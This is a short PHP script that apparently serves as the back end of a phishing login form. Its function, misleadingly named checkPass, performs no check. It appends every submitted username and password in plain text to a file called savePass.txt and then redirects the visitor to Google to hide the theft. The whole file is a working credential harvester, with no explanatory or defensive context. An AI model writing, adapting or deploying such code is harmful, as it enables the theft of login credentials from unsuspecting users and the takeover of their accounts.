<?PHP


function checkPass($user, $pass)
{
   $file = 'savePass.txt';
   $current = file_get_contents($file);

   $current .= "( ";
   $current .= $user;
   $current .= " ";
   $current .= $pass;
   $current .= " ) ";

   file_put_contents($file, $current);

   return true;
}

if(checkPass($_POST["user"], $_POST["haslo"])){
  header("Location: http://www.google.com/"); 
}
?>
